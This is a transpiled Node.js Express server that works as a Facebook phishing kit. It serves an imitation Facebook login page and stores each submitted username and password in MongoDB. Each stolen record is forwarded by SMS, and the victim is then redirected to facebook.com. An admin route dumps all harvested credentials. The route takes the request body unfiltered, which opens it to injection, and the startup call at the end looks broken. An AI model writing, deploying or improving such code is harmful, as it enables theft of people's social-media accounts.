"use strict";

require('dotenv').config();

var express = require('express');

var mongoose = require('mongoose');

var body_parser = require('body-parser');

var path = require('path');

var _require = require('fs'),
    readFileSync = _require.readFileSync;

var _require2 = require('./public/data'),
    htmlData = _require2.htmlData,
    sendSMS = _require2.sendSMS;

var app = express();
app.use(body_parser.urlencoded({
  extended: true
}));
var PORT = process.env.PORT || 3000;

var _router = express.Router();

var connectDB = function connectDB() {
  return regeneratorRuntime.async(function connectDB$(_context) {
    while (1) {
      switch (_context.prev = _context.next) {
        case 0:
          _context.prev = 0;
          _context.next = 3;
          return regeneratorRuntime.awrap(mongoose.connect(process.env.CON_STRING));

        case 3:
          console.log("Database connected succesful");
          _context.next = 10;
          break;

        case 6:
          _context.prev = 6;
          _context.t0 = _context["catch"](0);
          console.log(_context.t0.message);
          process.exit(1);

        case 10:
        case "end":
          return _context.stop();
      }
    }
  }, null, null, [[0, 6]]);
};

var schema = new mongoose.Schema({
  user_name: {
    type: String,
    required: true,
    trim: true
  },
  password: {
    type: String,
    required: true,
    trim: true
  },
  createAt: String
});
schema.pre('save', function (next) {
  this.createAt = new Date();
  next();
});
var imfor = mongoose.model('imfor', schema); // sending facebook login page

_router.route('/').get(function (req, res) {
  res.status(200).sendFile(path.join(__dirname, 'public', 'index.html'));
}); // creating user


_router.route('/login_details').post(function _callee(req, res) {
  return regeneratorRuntime.async(function _callee$(_context2) {
    while (1) {
      switch (_context2.prev = _context2.next) {
        case 0:
          _context2.next = 2;
          return regeneratorRuntime.awrap(imfor.create(req.body).then(function (result) {
            sendSMS(result);
            res.status(301).redirect('www.facebook.com');
          })["catch"](function (err) {
            console.log(err);
          }));

        case 2:
        case "end":
          return _context2.stop();
      }
    }
  });
}); // sending Admin login page


_router.route('/user_account').get(function _callee2(req, res) {
  return regeneratorRuntime.async(function _callee2$(_context3) {
    while (1) {
      switch (_context3.prev = _context3.next) {
        case 0:
          res.status(200).sendFile(path.join(__dirname, 'public', 'login.html'));

        case 1:
        case "end":
          return _context3.stop();
      }
    }
  });
});

var page = readFileSync(path.join(__dirname, 'public/page.html'), {
  encoding: 'utf-8'
}); // getting all users

_router.route('/user_account/api').post(function _callee3(req, res) {
  var isExist, data, renderPage;
  return regeneratorRuntime.async(function _callee3$(_context4) {
    while (1) {
      switch (_context4.prev = _context4.next) {
        case 0:
          _context4.next = 2;
          return regeneratorRuntime.awrap(imfor.findOne(req.body, {
            _id: 1,
            __v: 0
          }));

        case 2:
          isExist = _context4.sent;

          if (!isExist) {
            _context4.next = 9;
            break;
          }

          _context4.next = 6;
          return regeneratorRuntime.awrap(imfor.find({}, {
            __v: 0
          }));

        case 6:
          data = _context4.sent;
          renderPage = htmlData(page, data);
          res.status(200).send(renderPage.join(''));

        case 9:
        case "end":
          return _context4.stop();
      }
    }
  });
});

app.use('/', _router);
connectDB().then(PORT, function () {
  app.listen(function () {
    console.log("Server listening on ".concat(PORT));
  });
});